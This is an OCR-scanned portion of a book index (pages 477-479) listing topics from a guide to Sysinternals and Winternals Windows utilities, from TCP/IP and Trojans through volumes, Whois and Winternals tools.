security, 161-168 
tracking application configuration 
problems with, 383-384 
tombstoned objects, 293, 294 
tools. See programming tools; 
Sysinternals; utilities; Winternals 
tools map, network, 353 
Top Level Domain (TLD), 345 
tracing, DebugView for, 364-368, 386 
tracks, 218 
Transactional Log Area, LDM database, 
262 
Transmission Control Protocol (TCP), 
333-335 
Transmission Control Protocol/Internet 
Protocol (TCP/IP), 332 
Transport Driver Interface (TDI) 
commands, 356-359 
Trojans 
SmitFraud, 102-104 
system file replacement by, 56-57 
Vundo, 104 
troubleshooting 
data recovery, 287 
Defrag Manager, 246 
troubleshooting, network 
applications, identifying problematic, 
351-359 
connections, monitoring active, 
332-344 
DNS/reverse DNS lookups, 344-345 
overview of, 332 
public domain information, getting, 
346-350 
troubleshooting, system 
crash analysis, 300-308 

Index 
477 
errant drivers, identifying with 
LoadOrder, 308-311 
Filemon/Regmon/PsTools procedures, 
322-324 
file/registry access problems, detecting, 
311-318 
overview of, 300 
running processes analysis, 319-322 
U 
UDP/IP (User Datagram 
Protocol/Internet Protocol), 332 
Unix, 443-444 
updates. See Automatic Updates 
User, Autoruns menu function, 67 
User Datagram Protocol/Internet 
Protocol (UDP/IP), 332 
user documents, 272 
users 
login screen, bypassing, 452-453 
PsLoggedOn for viewing logged on, 
152-155 
viewing activity of, 152,212-213 
Users Menu, Process Explorer, 49 
utilities 
defragmentation, 415 
derivative, sample of, 397-398 
ERD Commander recovery, 14-15 
keyboard filter, 398-405 
for Microsoft Windows NT 4.0, 414 
NotMyFault, 304 
Sam Spade, 349 
with source code, 392-393 
WinHex tool, 286-287 
V 
VBLK database, 267 
verbose switch, Contig, 224-226,227 
Verify, Autoruns menu functions, 68 
Verify Code Signatures 
Autoruns menu option, 75 
description of, 66 
for limiting display results, 112 
viruses, 130 
Visual Basic 
loaded objects in, 370 
trace function in, 366-367 
Visual Basic .NET, 367 
Visual Studio 6 
compiling source code with, 396-397 
source code porting, 394-395 
Visual Studio 8, 394 
Visual Studio 2005, 395 
VMWare, virtual servers, recovering with 
ERD Commander, 9 
volume, simple, 248 
volume, striped, 248 
VOLUME DEFINITIONS section, 
LDMDump, 255-257 
Volume ID, 268-270 
Volume record, LDM database, 267 
Volume Serial Number (VSN), 268-270 
VolumelD tool, 269-270 
volumes 
damaged, repairing NT 4.0, 432 
disk, management of, 257-270 
DiskExt for extension determination, 
249-250 
DiskView for, 250-252 
in dynamic disk, 248 
Filemon, selecting in, 185-186 
IDs, managing, 268 

478 
Index 
LDMDump for information on, 
255-257 
NT 4.0, accessing from FAT volume, 
432-434, 437 
selecting in FileMon, 312-313 
VSN (Volume Serial Number), 268-270 
Vundo Trojan, 104 
W 
warnings, source code, 396-397 
Web site links 
for Autologon, 453 
for CacheSet, 415 
for Contig, 418 
for Ctrl2cap, 445 
for FileMon, 311 
for Frob, 423 
for Kernel-Mode Development 
Framework, 353 
for Loadorder, 308 
for NotMyFault, 304 
for NTFSCHK, 434 
for NTRecover, 426 
for PMon, 421 
for PsTools, 319 
for Regmon, 316 
for Sam Spade utility, 349 
for spammer tracking, 350 
for Sysinternals source code, 392 
for TCPView Pro/TCPVstat, 332 
for TCPView/Tcpvcon/TDIMon, 332 
tools documentation and, 393 
Windows 2003 Driver Development 
Kit, 362 
on Windows registry, 199 
Whois 
description of, 360--361 
function of, 353 
overview of, 346 
running/interpreting results, 346-350 
wildcard operators, 226-227 
Win32 API functions, 410, 411 
Windows 
debugging with LiveKd, 379-382,387 
VSN, changing, 269-270 
Windows 9.x 
BlueScreen on, 443, 456 
NTFSHLP.VXD and, 433, 437 
source code for, 392 
Windows 2003 Driver Development Kit 
(DDK), 353, 396 
Windows Disk Defragmenter 
limitations of, 220, 278 
time to defragment, 223 
Windows File Sharing, firewaUs and, 149 
Windows function calls, DebugView 
tracing, 364-365 
Windows login screen, bypassing, 457 
Windows Me, BlueScreen on, 443 
Windows Platform Software 
Development Kit (SDK), 396 
Windows Product Activation (WPA), 
269 
Windows Registry, 197-199 
. See also registry 
WinHex tool, 286-287 
WINLOGON, 68 
WINLOGON Notifications, Autoruns 
display feature groupings, 65 
WINLOGON Notify key, Look2Me 
and, 96-101 
Winsock Providers, Autoruns display 
feature groupings, 65 
Winternals 
Administrator's Pak, 300 

Inaex 
479 
CacheSet, 415-418 
Contig, 418-420 
Crash Analyzer Wizard, 300-308 
DebugView, 364-368 
Defrag Manager. See Defrag Manager 
Defrag Manager purchase, 232-233 
ERD Commander, 2 
LoadOrder, 308-311 
NTFSCHK, 434-435 
NTFSDOS, 432-434 
NTRecover, 425-432 
9 See also Sysinternals; Sysinternals 
source code 
workarounds, 307 
working set, 416 
WPA (Windows Product Activation), 
269 
Write permissions, 117 
wuauclt.exe, 54-55 

